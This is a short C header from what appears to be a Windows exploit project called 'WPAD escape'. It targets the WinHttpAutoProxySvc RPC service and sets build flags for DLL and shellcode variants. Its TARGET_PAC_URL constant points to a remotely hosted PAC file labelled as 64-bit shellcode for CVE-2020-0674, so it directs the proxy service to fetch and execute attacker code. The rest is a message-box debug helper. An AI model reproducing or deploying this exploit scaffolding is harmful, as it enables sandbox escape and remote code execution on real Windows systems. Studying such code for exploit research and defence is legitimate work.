#pragma once

#ifndef __WPAD_ESCAPE_H__
#define __WPAD_ESCAPE_H__

#define DLL_BUILD
#define SHELLCODE_BUILD
#define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit_Shellcode.pac"

#include <stdio.h>
#include <Windows.h>
#include <stdint.h>
#include "IWinHttpAutoProxySvc_h.h"


#pragma comment(lib, "rpcrt4.lib" )


void DEBUG(LPCWSTR Format, ...)
{
	va_list args;
	va_start(args, Format);

	WCHAR buffer[10000] = { 0 };
	wvsprintf(buffer, Format, args);
	va_end(args);

	MessageBoxW(0, buffer, L"WPAD escape", 0);
	//OutputDebugString(L"\n");
	//wprintf(buffer);
	//wprintf(L"\n");
	//printf("%ws\r\n", buffer);
}


#endif // !__WPAD_ESCAPE_H__
